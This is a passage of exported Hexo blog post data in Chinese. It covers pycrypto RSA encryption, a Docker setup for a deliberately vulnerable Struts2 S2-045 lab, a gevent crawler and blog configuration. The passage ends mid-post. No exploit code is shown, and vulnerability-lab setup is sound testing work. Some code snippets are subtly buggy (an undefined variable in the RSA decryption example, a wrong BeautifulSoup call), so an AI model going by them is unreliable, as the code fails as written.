    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>每个人都有自己的小秘密，如何保护好它是非常重要的。我通过Python27结合RSA算法保护我的”小秘密”。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>使用pycrypto库就可以完成RSA加、解密。</p><h3 id="Pycrypto"><a href="#Pycrypto" class="headerlink" title="Pycrypto"></a>Pycrypto</h3><p>使用pip快捷安装pycrypto。如果对pycrypto感兴趣，可以参考<a href="http://pythonhosted.org/pycrypto/" target="_blank" rel="noopener">文档</a>。</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> pycrypto</span><br></pre></td></tr></table></figure><p>如果无法使用pip安装，可以<a href="http://www.voidspace.org.uk/python/modules.shtml#pycrypto" target="_blank" rel="noopener">在这里</a>下载编译好的源文件进行安装。</p><h2 id="终端处理"><a href="#终端处理" class="headerlink" title="终端处理"></a>终端处理</h2><p>终端信息获取可以通过sys.argv或者使用getopt库。</p><h3 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h3><p>sys.argv是一个列表对象。用来获取终端信息。终端格式示例。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> getinfo.py <span class="literal">info</span>1 <span class="literal">info</span>2 <span class="literal">info</span>3</span><br></pre></td></tr></table></figure><p>sys.argv[0]是getinfo.py，sys.argv[1]是info1，sys.argv[2]是info2，sys.argv[3]是info3。</p><h3 id="Getopt"><a href="#Getopt" class="headerlink" title="Getopt"></a>Getopt</h3><p>getopt可以用来获取终端参数，实际使用的时候效果比sys.argv好很多。如果对getopt感兴趣，可以参考<a href="https://docs.python.org/2/library/getopt.html" target="_blank" rel="noopener">文档</a><br>getopt有短格式、长格式。”-h-f:”为短格式，如果后面带冒号说明该参数需要加参数值，不加冒号说明该参数不需要加参数值。”[‘help’, ‘file=’]”为长格式，如果后面带等号说明该参数需要加参数值，如果后面不带等号说明该参数不需要参数值。<br>终端格式示例。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> getinfo.py -h -f=<span class="literal">info</span>.txt</span><br></pre></td></tr></table></figure><p>代码示例。</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import getopt</span><br><span class="line"><span class="keyword">opt</span>, <span class="keyword">args</span> = getopt.getopt(sys.<span class="built_in">argv</span>[<span class="number">1</span>:], <span class="string">"-h-f:"</span>,[<span class="string">'help'</span>, <span class="string">'file='</span>])</span><br><span class="line"><span class="keyword">for</span> opt_name, opt_value in <span class="keyword">opt</span><span class="variable">s:</span></span><br><span class="line">    <span class="keyword">if</span> opt_name in (<span class="string">'-h'</span>, <span class="string">'--help'</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"This is help!"</span></span><br><span class="line">    <span class="keyword">if</span> opt_name in (<span class="string">'-f'</span>, <span class="string">'--file'</span>):</span><br><span class="line">        <span class="keyword">print</span> opt_value</span><br></pre></td></tr></table></figure><h2 id="pycrypto使用"><a href="#pycrypto使用" class="headerlink" title="pycrypto使用"></a>pycrypto使用</h2><p>pycrypto包含许多加密方式：AES、SHA256、RSA等。出于安全性考虑，我使用RSA来加密文件。</p><h3 id="生成公、私钥文件"><a href="#生成公、私钥文件" class="headerlink" title="生成公、私钥文件"></a>生成公、私钥文件</h3><p>RSA加密需要使用到公钥文件、RSA解密需要使用到私钥文件。如果大家对RSA算法不了解的话，可以参考<a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank" rel="noopener">Wiki</a>。<br>通过上文可以得知，生成自己的公钥、私钥文件是十分重要的。pycrypto支持生成公钥、私钥文件。<br>代码示例。</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">from</span> Crypto import Random</span><br><span class="line"><span class="built_in">from</span> Crypto.Cipher import PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="built_in">from</span> Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random_generator = Random.<span class="built_in">new</span>().<span class="built_in">read</span>  <span class="comment"># 伪随机数生成器</span></span><br><span class="line">rsa = RSA.generate(self.generateNum, random_generator)  <span class="comment"># rsa算法生成</span></span><br><span class="line">private_pem = rsa.exportKey()  <span class="comment"># 私钥生成</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'private.pem'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:  <span class="comment"># 生成私钥文件</span></span><br><span class="line">    f.<span class="built_in">write</span>(private_pem)</span><br><span class="line">public_pem = rsa.publickey().exportKey()  <span class="comment"># 公钥生成</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'public.pem'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:  <span class="comment"># 生成公钥文件</span></span><br><span class="line">    f.<span class="built_in">write</span>(public_pem)</span><br></pre></td></tr></table></figure><h3 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h3><p>RSA加密需要使用到公钥文件。<br>代码示例。</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">from</span> Crypto import Random</span><br><span class="line"><span class="built_in">from</span> Crypto.Cipher import PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="built_in">from</span> Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">"My name is Hywell!"</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'public.pem'</span>) <span class="keyword">as</span> f:  <span class="comment"># 读取公钥文件</span></span><br><span class="line">    key = f.<span class="built_in">read</span>()</span><br><span class="line">rsakey = RSA.importKey(key)  <span class="comment"># 加载公钥</span></span><br><span class="line">cipher = Cipher_pkcs1_v1_5.<span class="built_in">new</span>(rsakey)</span><br><span class="line">cipher_text = cipher.<span class="built_in">encrypt</span>(message)  <span class="comment"># 加密message</span></span><br></pre></td></tr></table></figure><h3 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h3><p>RSA解密需要使用到私钥文件。<br>代码示例。</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">from</span> Crypto import Random</span><br><span class="line"><span class="built_in">from</span> Crypto.Cipher import PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="built_in">from</span> Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">"This is cryptoStr!"</span></span><br><span class="line">random_generator = Random.<span class="built_in">new</span>().<span class="built_in">read</span>  <span class="comment"># 伪随机数生成器</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'ghost-private.pem'</span>) <span class="keyword">as</span> f:  <span class="comment"># 读取私钥文件</span></span><br><span class="line">    key = f.<span class="built_in">read</span>()</span><br><span class="line">rsakey = RSA.importKey(key)  <span class="comment"># 加载私钥</span></span><br><span class="line">cipher = Cipher_pkcs1_v1_5.<span class="built_in">new</span>(rsakey)</span><br><span class="line"><span class="built_in">result</span> = cipher.<span class="built_in">decrypt</span>(base64.b64decode(encrypt_text), random_generator)  <span class="comment"># 解密cipher_text</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在编写使用RSA加密文件时，遇到了几个问题，在此记录一下。</p><ol><li>使用getopt库作为命令行参数获取，使用for获取对应参数的值的时候，获取得到值是以=开头。因此，实际需要使用value[1:]来获取;</li><li>RSA加密常见的key_size有1024bit、2048bit两种，解密的时候需要选择跟加密时一样的bit;</li><li>RSA加密单次加密字符的长度有限制，最大为(key_size/8)-11;</li><li>使用1024bitRSA加密100长度的字符会生成128长度的加密过的字符;</li><li>使用2048bitRSA加密200长度的字符会生成256长度的加密过的字符。</li></ol><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>完整代码支持终端获取参数、文件夹所有文件RSA加密、文件夹所有文件RSA解密。<br>完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！<strong><a href="https://github.com/HyWell/Python/blob/master/Os/Encryptiong.py" target="_blank" rel="noopener"><font color="blue">Code</font></a></strong>。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>加密工具</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞环境搭建</title>
    <url>/archives/583f4516.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>在进行安全测试的时候，经常需要搭建各种各样、不同配置的漏洞环境。有时候一天不到就能搞定，有时候两三天都没成功。后来发现一个神器:Docer，结合GitHub上面的漏洞靶场可以通过几条命令就能成功”搭建”一个漏洞环境。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>本文选用Debian作为操作环境。大家也可以根据自己的操作系统，安装对应Docker。大家可以去<a href="https://www.docker.com" target="_blank" rel="noopener">Docker官网</a>查看如何安装，也可以去<a href="http://www.docker.org.cn/book/install/supported-platform-17.html" target="_blank" rel="noopener">Docker中文</a>看如何安装。</p><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>安装Docker之前需要在/etc/apt/sources.list文件中添加backports源。使用Vim命令。(下面所有命令建议在root权限下执行，要不然请在命令前加sudo。)</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/apt/sources.<span class="keyword">list</span></span><br></pre></td></tr></table></figure><p>添加<code>deb http://http.debian.net/debian jessie-backports main</code>，执行更新操作。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">apt-<span class="keyword">get</span> <span class="keyword">update</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/59910c63e2518.png" alt="apt-get update.png"><br>成功更新之后，安装docker.io。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install docker.io</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/59910f677c8d5.png" alt="apt-get install docker.io.png"><br>查看Docker版本信息。</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">docker <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/599117af1e74b.png" alt="docker version.png"></p><h3 id="添加漏洞环境"><a href="#添加漏洞环境" class="headerlink" title="添加漏洞环境"></a>添加漏洞环境</h3><p>接下来就可以使用Docer添加对应的漏洞环境，那么漏洞环境在哪里找勒？这里我推荐两个地址:<a href="https://github.com/phith0n/vulhub" target="_blank" rel="noopener">phith0h</a>、<a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">Medicean</a>。<br>这里我以Struts2-S2-045为例：[S2-045][<a href="https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-045]。" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-045]。</a><br>将环境下载到本地，如果使用命令无法成功下载，那么多下载几次或者设置一下代理(你懂的)。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_struts2_s2<span class="number">-045</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/599119aa146fa.png" alt="docker pull.png"><br>下载完成之后，启动环境。-p后面的参数是将容器的端口映射到本机的端口，-p 80:8080就是将容器的8080端口映射到本机的80端口，可以自定义修改。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker run -d -p <span class="number">80</span>:<span class="number">8080</span> medicean/vulapps:s_struts2_s2<span class="number">-045</span></span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用Exploit工具复现S2-045漏洞。<br><img src="https://i.loli.net/2017/08/14/599118e97fa7c.png" alt="exploit.png"></p><h2 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h2><p>查看所有镜像。</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/599119541645f.png" alt="docker images.png"><br>拉取镜像。</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker pull</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/599119aa146fa.png" alt="docker pull.png"><br>保存镜像。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker save medicean/vulapps:s_struts2_s2<span class="number">-045</span> &gt; /tmp/s2<span class="number">-045.</span>tar</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/59911a3e90e51.png" alt="docker save.png"><br>加载镜像。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker load &lt; /tmp/s2<span class="number">-045.</span>tar</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/59911aac6d77c.png" alt="docker load.png"><br>查看正在运行的容器。</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/59911b3acb2c4.png" alt="docker ps.png"><br>停止容器，使用docker ps查看的id来停止对应容器。</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">stop</span> ddedb0cd35e5</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/59911bea2acf5.png" alt="docker stop.png"><br>启动容器。</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">docker <span class="literal">start</span> ddedb0cd35e5</span><br></pre></td></tr></table></figure><p>关闭容器。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">kill</span> ddedb0cd35e5</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/59911c355130b.png" alt="docker kill.png"><br>删除镜像，如果不知道id可以使用Tab键来进行补全查看。</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker rm <span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/14/59911d4829cb9.png" alt="docker rm.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用Docker虽然可以快速的部署漏洞环境，但是这样不容易理解一些由于配置问题导致的漏洞。因此，建议在新漏洞出现之后使用Docker快速复现完成后，自己手工搭建一遍。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>工具环境</category>
      </categories>
      <tags>
        <tag>漏洞环境</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2-并发爬虫</title>
    <url>/archives/426443e5.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>现在数据就是王道，而爬虫就是获取数据的快速途径之一！</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>看标题，咱们就应该知道需要用到Python27。本文通过Python 结合 requests库进行爬取操作，BeautifulSoup4使用lxml进行解析操作，gevent进行并发操作。</p><h3 id="Python27"><a href="#Python27" class="headerlink" title="Python27"></a>Python27</h3><p>选择对应的操作系统的<a href="https://www.python.org/downloads/release/python-2713/" target="_blank" rel="noopener">Python27</a>进行下载。下载完成进行安装，之后配置环境变量即可。环境变量需要配置两处，一处是Python27的安装目录，一处是Python27安装目录下的Scripts目录。</p><h3 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h3><p>右键【我的电脑】→【属性】，点击【高级系统设置】中的【高级】选项卡中【环境变量】，在【系统变量】窗口中找到【Path】变量。点击【编辑】，加入对应的环境变量（例如D:\Code\Python27、D:\Code\Python27\Scripts）。如果是Win10系统，新建两条即可。如果是Win10等系统，点击编辑之后在后面加入<code>;D:\Code\Python27;D:\Code\Python27\Scripts</code>即可。<br><img src="https://i.loli.net/2017/08/12/598ed1cab3324.png" alt="环境变量.png"></p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> --<span class="keyword">version</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/12/598e57d202304.png" alt="python --version.png"></p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">pip <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/12/598e5c1da50ec.png" alt="pip --version.png"></p><h3 id="Requests"><a href="#Requests" class="headerlink" title="Requests"></a>Requests</h3><p>使用pip快捷安装requests。</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> requests</span><br></pre></td></tr></table></figure><h3 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h3><p>使用pip快捷安装BeautifulSoup4。</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> beautifulsoup4</span><br></pre></td></tr></table></figure><h3 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h3><p>使用pip快捷安装lxml。</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> lxml</span><br></pre></td></tr></table></figure><h3 id="Gevent"><a href="#Gevent" class="headerlink" title="Gevent"></a>Gevent</h3><p>使用pip快捷安装gevent。</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> gevent</span><br></pre></td></tr></table></figure><h2 id="爬取流程"><a href="#爬取流程" class="headerlink" title="爬取流程"></a>爬取流程</h2><p>在准备阶段，咱们已经将“斧柄”、“斧刃”准备好了，到时候把两个组装起来，选一棵树，进行“伐木”工作。<br>爬取流程分为：获得url、访问url、解析页面、获取页面url。</p><h3 id="入口url"><a href="#入口url" class="headerlink" title="入口url"></a>入口url</h3><p>由于本文只爬取站点中存在的url，并不取特殊数据。因此，入口url可以自定义输入。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">entry_url = raw<span class="constructor">_input('Place <span class="params">enter</span> <span class="params">the</span> <span class="params">entry</span> <span class="params">url</span>:')</span></span><br></pre></td></tr></table></figure><h3 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h3><p>请求页面操作通过使用requests库来完成。如果对requests库感兴趣，可以参考<a href="http://docs.python-requests.org/en/master/" target="_blank" rel="noopener">官方文档</a>。<br>想要使用requests库，需要先导入requests库。这步操作就是将斧柄(Pythnon27)、斧刃(requests)组装起来。</p><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure><p>接下来就需要使用requests库的get方法。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = requests.get(entry_url)</span><br></pre></td></tr></table></figure><h3 id="解析页面"><a href="#解析页面" class="headerlink" title="解析页面"></a>解析页面</h3><p>通过上面的操作，咱们已经获取了页面的信息。然后就是BeautifulSoup4发挥的时候了。如果对BeautifulSoup4库感兴趣，可以参考<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/" target="_blank" rel="noopener">官方文档</a></p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></table></figure><p>本文爬虫只需要获取站点url即可，不需要获取站点特殊数据。因此，获取a标签的href方法的值即可。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">soup = BeautifulSoup(r.text, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.<span class="builtin-name">find</span>(<span class="string">'a'</span>):</span><br><span class="line">    get_url = i.<span class="builtin-name">get</span>(<span class="string">'href'</span>)</span><br></pre></td></tr></table></figure><h2 id="异步爬取"><a href="#异步爬取" class="headerlink" title="异步爬取"></a>异步爬取</h2><p>异步爬取可以让程序执行更快，时间既是生命。如果对gevent库感兴趣，可以参考<a href="http://www.gevent.org/contents.html" target="_blank" rel="noopener">官方文档</a>。</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列(Queue)适用于多线程编程，让数据安全地在生产者与消费者之间进行信息传递。<br>让url放在队列数据结构中，可以让队列自动帮我们销毁已经被调用的url。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent.queue import Queue</span><br><span class="line"></span><br><span class="line">urlQueue = Queue()</span><br></pre></td></tr></table></figure><h3 id="异步工作"><a href="#异步工作" class="headerlink" title="异步工作"></a>异步工作</h3><p>将工作流程制作成函数，调用gevent.spawn形成工作队列。当适当的时候执行。</p><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="title">threads</span>=[]</span><br><span class="line"><span class="title">threads</span>.append(gevent.spawn(work, **keyword))</span><br><span class="line"><span class="title">gevent</span>.joinall(threads)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在编写并发爬虫的时候，遇到了几个问题，在此记录一下。</p><ol><li>url请求是http还是https，如果是https的话，需要将requests的verify设置为False;</li><li>并发的时候如何判断任务是否已经结束？我是通过判断队列为空并且无待工作的任务，不知道这种判断方式是否可取。有没有好心人告诉我有什么优雅的方式么;</li><li>如果对并发量不进行设置的话，有可能导致内存飙高。我通过对线程列表进行设置，当线程列表到100时就运行一次。同求优雅的方式;</li><li>href方法里面存在两种情况：包含域名(href=”<a href="http://xxx.com/index.html&quot;)，不包含域名(href=&quot;/index.html&quot;)" target="_blank" rel="noopener">http://xxx.com/index.html&quot;)，不包含域名(href=&quot;/index.html&quot;)</a>;</li><li>用户输入与href方法内情况不同。例如用户输入<a href="https://www.iassas.com，页面href标签是https://iassas.com（或者两者反一下）。现在就按照用户输入为准" target="_blank" rel="noopener">https://www.iassas.com，页面href标签是https://iassas.com（或者两者反一下）。现在就按照用户输入为准</a>;</li><li>子域名链接爬取，现在判断逻辑不爬取子域名;</li><li>href方法中的url有可能会带有#(跳转对应页面位置)，模拟浏览器是将#后面所有字符不当成url考虑;</li><li>url会被url编码，调用urllib.unquote来解码。<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2>完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！<strong><a href="https://github.com/HyWell/Python/blob/master/Crawler/Gevent-requests.py" target="_blank" rel="noopener"><font color="blue">Code</font></a></strong>。由于Web环境千奇百怪，程序出错在所难免。请体谅！</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>博客配置</title>
    <url>/archives/459ba203.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>通过GitHub Page + Hexo(Next主题)搭建好博客之后，需要对<strong><font color="blue">站点配置文件</font></strong>、<strong><font color="red">主题配置文件</font></strong>进行自定义配置。本篇文章对一些常用或需要自定义的配置进行描述。</p><a id="more"></a><h2 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h2><p><strong><font color="blue">站点配置文件</font></strong>为全局配置文件，影响整个站点。文件路径:\根目录\_config.yml。</p><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><p>站点基础配置包括标题、副标题、描述、作者、站点语言、URL设置等。通过对基础配置进行修改，就可以完成大部分的”轻度折腾”。</p><h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h4><p>标题会影响整站的标题，并且会在显示页面上。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">title:</span> 站点标题</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598cffd0b6300.png" alt="title.png"></p><h4 id="副标题"><a href="#副标题" class="headerlink" title="副标题"></a>副标题</h4><p>副标题位于在主标题下，在Next主题中会被隐藏，需要通过修改\根目录\themes\next\source\css\_schemes\Mist\_logo.styl的.site-subtitile字段的display值或者在.site-subtitle前面加#进行注释。</p><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">subtitle: </span>站点副标题</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d002d4f3cc.png" alt="subtitle.png"></p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>描述位于站点概览中，用最”简单”的语言描述一下最棒的自己。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">description:</span> 最简单的语言</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d012b11997.png" alt="description.png"></p><h4 id="作者"><a href="#作者" class="headerlink" title="作者"></a>作者</h4><p>作者位于站点概览、版本声明等位置，留下自己的大名，让自己”声名远扬”吧！</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">author:</span> 最棒的自己</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d023a48148.png" alt="author.png"></p><h4 id="站点语言"><a href="#站点语言" class="headerlink" title="站点语言"></a>站点语言</h4><p>站点语言会影响整个站点的显示语言。支持简中、繁中、英文等。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">language:</span> <span class="built_in">zh</span>-Hans</span><br></pre></td></tr></table></figure><pre><code>|语言　　　|对应值　　　|
|English　|en　　　　　|
|简体中文　|zh-Hans　　 | 
|法语　　　|fr-FR　　　 ｜
|繁体中文　|zh-hk/zh-tw｜
|俄语　　　|ru　　　　　｜
|德语　　　|de　　　　　｜
|葡萄牙语　|pt　　　　　｜
|日语　　　|ja　　　　　｜</code></pre><h4 id="URL设置"><a href="#URL设置" class="headerlink" title="URL设置"></a>URL设置</h4><p>URL设置包括url、enforce_ssl、root、permalink、permalink_default等字段。其中url字段设置为博客域名。根据博客所处目录设置root，如果为子目录，root需要进行对应修改。其余字段可保持不变。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">url:</span> 你的域名</span><br><span class="line"><span class="symbol">root:</span> 站点所处目录</span><br></pre></td></tr></table></figure><h3 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h3><h4 id="分页设置"><a href="#分页设置" class="headerlink" title="分页设置"></a>分页设置</h4><p>分页设置主要修改per_page字段，可以对主页、档案、标签等进行每页显示文章数设置。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">''</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">5</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br><span class="line"><span class="attr">archive_generator:</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">20</span></span><br><span class="line">  <span class="attr">yearly:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">monthly:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">tag_generator:</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><h4 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h4><p>RSS位于站点概览中，可以通过安装插件来完成，安装hexo-generator-feed。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-generator-feed  <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>安装插件之后，通过配置plugin字段加载插件。</p><figure class="highlight ldif"><table><tr><td class="code"><pre><span class="line"><span class="attribute">plugin</span>: </span><br><span class="line"><span class="literal">- hexo-generator-feed</span></span><br></pre></td></tr></table></figure><p>对feed字段进行配置，如果不存在，则新建feed字段。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">hub:</span></span><br><span class="line">  <span class="attr">content:</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d14d0d8932.png" alt="RSS.png"></p><h4 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h4><p>下载喜欢的主题，通过修改theme字段进行更换主题。<strong><a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">Next主题下载</a></strong>，也可以在hexo提供的主题<strong><a href="https://hexo.io/themes/" target="_blank" rel="noopener">下载页面</a></strong>寻找喜欢的主题。</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">theme: <span class="keyword">next</span></span><br></pre></td></tr></table></figure><h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p>这里介绍Next的主题配置，<strong><font color="red">主题配置文件</font></strong>文件路径:\根目录\themes\next\_config.yml。</p><h3 id="站标"><a href="#站标" class="headerlink" title="站标"></a>站标</h3><p>站标位于标签页左边,路径指向source目录下。建议ico大小为32x32。<strong><a href="http://www.faviconico.org/" target="_blank" 